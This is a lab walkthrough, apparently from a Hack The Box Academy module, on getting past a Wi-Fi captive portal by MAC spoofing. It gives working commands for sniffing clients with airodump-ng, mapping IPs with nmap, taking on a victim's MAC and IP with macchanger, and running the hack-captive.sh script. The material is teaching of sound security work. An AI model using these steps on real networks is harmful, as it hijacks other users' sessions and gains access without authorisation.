
<h1>MAC Address Spoofing</h1>
<hr/>
<p>If a captive portal relies on MAC address lists for post-authentication access control, a common attack vector is <code>MAC spoofing</code>. By impersonating an authenticated client, we may be able to bypass the captive portal's restrictions entirely. This classic bypass technique remains effective against many networks, though some have implemented countermeasures to mitigate it.</p>
<p><img alt="Macspoof" src="https://academy.hackthebox.com/storage/modules/299/macspoof/000.png"/></p>
<hr/>
<h3>Connecting to Wi-Fi Network</h3>
<p>We start by connecting to the <code>HTB-Guest</code> network</p>
<p><img alt="Macspoof" src="https://academy.hackthebox.com/storage/modules/299/macspoof/connect_general.PNG"/></p>
<p>Once we connect to the Wi-Fi network, navigating to <code>captive.htb.local</code> in a browser will present us with a login prompt.</p>
<img class="website-screenshot" data-url="http://captive.htb.local" src="https://academy.hackthebox.com/storage/modules/299/vpn/001.PNG"/>
<hr/>
<h3>Attacking Manually</h3>
<p>We aim to perform an external scan using <code>airodump-ng</code>, as this approach generates significantly less noise within the network compared to an <code>Nmap</code> scan, which will be conducted later.</p>
<p>Since we require monitor mode, we will run airmon-ng on our <code>wlan1</code> interface.</p>
<pre><code class="language-shell-session">[!bash!]$ airmon-ng start wlan1

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    178 avahi-daemon
    192 wpa_supplicant
    197 avahi-daemon
    208 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy2	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan1 on [phy2]wlan1mon)
		(mac80211 station mode vif disabled for [phy2]wlan1)
</code></pre>
<p>With monitor mode enabled, we now use <code>airodump-ng</code> to scan the network for available Wi-Fi access points and connected clients. This helps us identify the <code>MAC addresses</code> of clients connected to the target AP, allowing our attack on targeted devices within the network.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo airodump-ng -c 1 --bssid B4:5C:B0:E8:FC:EB wlan1mon

CH  1 ][ Elapsed: 15 s ][ 1234-56-78 12:34 ][ ]

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

B4:5C:B0:E8:FC:EB  -50 100      183      553    0   1   11   OPN              HTB-Guest

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

B4:5C:B0:E8:FC:EB  3E:C2:CC:02:21:08  -42   24 - 36 27 3022
B4:5C:B0:E8:FC:EB  00:2f:fc:67:8a:5d  -56   36 - 48 12 1289
B4:5C:B0:E8:FC:EB  a5:5b:e6:8c:aa:9f  -16   11 - 54 6 700
B4:5C:B0:E8:FC:EB  d0:5d:8d:13:08:f7  -70   11 - 11 2 63
B4:5C:B0:E8:FC:EB  68:1b:64:41:9f:16  -61   11 - 18 5 583
B4:5C:B0:E8:FC:EB  58:1b:6f:99:28:ee  -29   36 - 54 8 910
B4:5C:B0:E8:FC:EB  c8:96:f6:22:9a:bf  -73   11 - 36 3 255
B4:5C:B0:E8:FC:EB  e4:28:4b:41:3e:3d  -52   24 - 48 7 759
B4:5C:B0:E8:FC:EB  80:6c:b7:ea:3d:8a  -26   54 - 54 4 441
B4:5C:B0:E8:FC:EB  90:53:22:15:e6:71  -62   11 - 18 2 159
B4:5C:B0:E8:FC:EB  5c:1a:cf:b5:8f:cc  -18   11 - 18 9 1031
</code></pre>
<p>After compiling a list of MAC addresses from connected clients, the next step is to identify their corresponding <code>IP addresses</code>. This can be achieved using the nmap command and filtering the results with <code>awk</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo nmap -v -n -sn  192.168.0.1/24  | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}/MAC Address:/{print " =&gt; "$3;}'

192.168.0.1
 =&gt; 52:CD:8C:79:AD:87
192.168.0.58
 =&gt; 80:6c:b7:ea:3d:8a
192.168.0.59
 =&gt; 90:53:22:15:e6:71
192.168.0.60
 =&gt; 5c:1a:cf:b5:8f:cc
</code></pre>
<p>Having identified a target client to impersonate, we can now proceed with MAC address spoofing. By changing our MAC address to match the selected client's MAC, we can potentially bypass the captive portal as an authenticated device (assuming the client already has an active session within the Wi-Fi network).</p>
<p>To do this on a Linux system, we first take the network interface down, change the MAC address to match with the selected client, and then bring it back up:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo ifconfig wlan0 down
[!bash!]$ sudo macchanger -m 5c:1a:cf:b5:8f:cc wlan0
[!bash!]$ sudo ifconfig wlan0 up
</code></pre>
<p>After successfully spoofing the target client's MAC address, we must also spoof their IP address and configure the correct default gateway to ensure network connectivity.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo ifconfig wlan0 192.168.0.60 netmask 255.255.255.0
[!bash!]$ sudo route add default via 192.168.0.1
</code></pre>
<p>We check if we can now communicate as the spoofed client:</p>
<img class="website-screenshot" data-url="http://captive.htb.local" src="https://academy.hackthebox.com/storage/modules/299/macspoof/002_.png"/>
<hr/>
<h3>Automating the Attack</h3>
<p>To automate this attack, we can use the <a href="https://raw.githubusercontent.com/crishoj/hack-captive-portals/refs/heads/master/hack-captive.sh">hack-captive</a> script. In the lab environment, script is available in the Desktop folder. This script automates the process of identifying authenticated clients, extracting their MAC and IP addresses, and spoofing them to bypass captive portals.</p>
<p>We start by cloning the tool from GitHub, ensuring that <code>sipcalc</code> and <code>nmap</code> are installed, and updating the permissions on our bash script to make it executable.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo apt -y install sipcalc nmap
[!bash!]$ git clone https://github.com/systematicat/hack-captive-portals.git
[!bash!]$ cd hack-captive-portals
[!bash!]$ sudo chmod u+x hack-captive.sh
</code></pre>
<p>Once we are connected to the Wi-Fi network, we can launch our MAC/IP spoofing attack.</p>
<pre><code class="language-shell-session">[!bash!]$ sudo bash hack-captive.sh

Exploring network in "HTB-Guest" Wi-Fi hotspot
Looking for active hosts in 192.168.0.0/24. Please wait.
Trying to hijack 192.168.0.2 - a5:5b:e6:8c:aa:9f
Trying to hijack 192.168.0.12 - 5c:1a:cf:b5:8f:cc
Trying to hijack 192.168.0.53 - d0:5d:8d:13:08:f7
Trying to hijack 192.168.0.69 - 68:1b:64:41:9f:16
Trying to hijack 192.168.0.72 - 58:1b:6f:99:28:ee
Trying to hijack 192.168.0.118 - c8:96:f6:22:9a:bf
Trying to hijack 192.168.0.128 - e4:28:4b:41:3e:3d
Trying to hijack 192.168.0.165 - 80:6c:b7:ea:3d:8a
Trying to hijack 192.168.0.177 - 90:53:22:15:e6:71
Trying to hijack 192.168.0.178 - 00:2f:fc:67:8a:5d
Pwned! Now you can surf the Internet!
</code></pre>
<p>When the attack is complete, we can revisit the captive portal to check if we have successfully gained access to the network. If the MAC spoofing was successful, we should now be authenticated without needing to enter credentials.</p>
<img class="website-screenshot" data-url="http://captive.htb.local" src="https://academy.hackthebox.com/storage/modules/299/macspoof/002_.png"/>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"> When spoofing a MAC address, collisions at the data-link layer are common. These occur when both the legitimate client and the spoofed device attempt to use the same MAC address on the same network segment. To successfully complete the lab, it is crucial to quickly perform a hard refresh of the captive portal page using <code>Ctrl+Shift+R</code> to capture the flag. Due to the collision events, maintaining a stable connection for an extended period will not be possible.</p>
</div>
</div>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2968 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2968"><span class="badge badge-soft-dark font-size-14 mr-2">+ 3 <i class="fad fa-cube text-success"></i></span> Perform MAC spoofing to log in to the captive portal. What is the flag displayed after login?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2968" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2968">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2968" id="btnAnswer2968">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
